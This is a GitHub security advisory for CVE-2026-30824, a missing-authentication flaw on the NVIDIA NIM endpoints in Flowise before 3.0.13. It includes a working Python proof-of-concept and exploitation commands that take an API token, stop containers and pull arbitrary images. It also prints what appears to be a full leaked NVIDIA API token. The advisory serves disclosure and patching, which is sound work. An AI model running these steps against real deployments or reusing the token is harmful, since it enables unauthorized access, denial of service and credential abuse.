# [H] Flowise Missing Authentication on NVIDIA NIM Endpoints

## Summary
Severity: High
Advisory: GHSA-5f53-522j-j454
CVE: CVE-2026-30824
CWE: CWE-306
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:N/SA:N (CVSS_V4)
Published: 2026-03-06
Source: https://github.com/advisories/GHSA-5f53-522j-j454
Type: github-advisory

## Affected
- npm: `flowise` — affected >=0 <3.0.13

## Details
# Missing Authentication on NVIDIA NIM Endpoints

## Summary

The NVIDIA NIM router (`/api/v1/nvidia-nim/*`) is whitelisted in the global authentication middleware, allowing unauthenticated access to privileged container management and token generation endpoints.

## Vulnerability Details

| Field | Value |
|-------|-------|
| CWE | CWE-306: Missing Authentication for Critical Function |
| Affected File | `packages/server/src/utils/constants.ts` |
| Affected Line | Line 20 (`'/api/v1/nvidia-nim'` in `WHITELIST_URLS`) |
| CVSS 3.1 | 8.6 (High) |

## Root Cause

In `packages/server/src/utils/constants.ts`, the NVIDIA NIM route is added to the authentication whitelist:

```typescript
export const WHITELIST_URLS = [
    // ... other URLs
    '/api/v1/nvidia-nim',  // Line 20 - bypasses JWT/API-key validation
    // ...
]
```

This causes the global auth middleware to skip authentication checks for all endpoints under `/api/v1/nvidia-nim/*`. None of the controller actions in `packages/server/src/controllers/nvidia-nim/index.ts` perform their own authentication checks.

## Affected Endpoints

| Method | Endpoint | Risk |
|--------|----------|------|
| GET | `/api/v1/nvidia-nim/get-token` | Leaks valid NVIDIA API token |
| GET | `/api/v1/nvidia-nim/preload` | Resource consumption |
| GET | `/api/v1/nvidia-nim/download-installer` | Resource consumption |
| GET | `/api/v1/nvidia-nim/list-running-containers` | Information disclosure |
| POST | `/api/v1/nvidia-nim/pull-image` | Arbitrary image pull |
| POST | `/api/v1/nvidia-nim/start-container` | Arbitrary container start |
| POST | `/api/v1/nvidia-nim/stop-container` | Denial of Service |
| POST | `/api/v1/nvidia-nim/get-image` | Information disclosure |
| POST | `/api/v1/nvidia-nim/get-container` | Information disclosure |

## Impact

### 1. NVIDIA API Token Leakage

The `/get-token` endpoint returns a valid NVIDIA API token without authentication. This token grants access to NVIDIA's inference API and can list 170+ LLM models.

**Token obtained:**
```json
{
  "access_token": "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",
  "token_type": "Bearer",
  "expires_in": 3600
}
```

**Token validation:**
```bash
curl -H "Authorization: Bearer nvapi-GT-..." https://integrate.api.nvidia.com/v1/models
# Returns list of 170+ available models
```

### 2. Container Runtime Manipulation

On systems with Docker/NIM installed, an unauthenticated attacker can:
- List running containers (reconnaissance)
- Stop containers (Denial of Service)
- Start containers with arbitrary images
- Pull arbitrary Docker images (resource consumption, potential malicious images)

## Proof of Concept

### poc.py

```python
#!/usr/bin/env python3
"""
POC: Privileged NVIDIA NIM endpoints are unauthenticated

Usage:
  python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/get-token
"""

import argparse
import urllib.request
import urllib.error

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="Base URL, e.g. http://host:port")
    ap.add_argument("--path", required=True, help="NIM endpoint path")
    ap.add_argument("--method", default="GET", choices=["GET", "POST"])
    ap.add_argument("--data", default="", help="Raw request body for POST")
    args = ap.parse_args()

    url = args.target.rstrip("/") + "/" + args.path.lstrip("/")
    body = args.data.encode("utf-8") if args.method == "POST" else None
    req = urllib.request.Request(
        url,
        data=body,
        method=args.method,
        headers={"Content-Type": "application/json"} if body else {},
    )

    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            print(r.read().decode("utf-8", errors="replace"))
    except urllib.error.HTTPError as e:
        print(e.read().decode("utf-8", errors="replace"))

if __name__ == "__main__":
    main()
```

<img width="1581" height="595" alt="screenshot" src="https://github.com/user-attachments/assets/85351a88-64ce-4e2c-8e67-98f217fcf989" />

### Exploitation Steps

```bash
# 1. Obtain NVIDIA API token (no authentication required)
python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/get-token

# 2. List running containers
python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/list-running-containers

# 3. Stop a container (DoS)
python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/stop-container \
  --method POST --data '{"containerId":"<target_id>"}'

# 4. Pull arbitrary image
python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/pull-image \
  --method POST --data '{"imageTag":"malicious/image","apiKey":"any"}'
```

### Evidence

**Token retrieval without authentication:**
```
$ python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/get-token
{"access_token":"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","token_type":"Bearer","refresh_token":null,"expires_in":3600,"id_token":null}
```

**Token grants access to NVIDIA API:**
```
$ curl -H "Authorization: Bearer nvapi-GT-..." https://integrate.api.nvidia.com/v1/models
{"object":"list","data":[{"id":"01-ai/yi-large",...},{"id":"meta/llama-3.1-405b-instruct",...},...]}
```

**Container endpoints return 500 (not 401) proving auth bypass:**
```
$ python poc.py --target http://127.0.0.1:3000 --path /api/v1/nvidia-nim/list-running-containers
{"statusCode":500,"success":false,"message":"Container runtime client not available","stack":{}}
```

## References

- [CWE-306: Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [OWASP API Security Top 10 - API2:2023 Broken Authentication](https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/)

## References
- https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-5f53-522j-j454
- https://nvd.nist.gov/vuln/detail/CVE-2026-30824
- https://github.com/FlowiseAI/Flowise
- https://github.com/FlowiseAI/Flowise/releases/tag/flowise%403.0.13
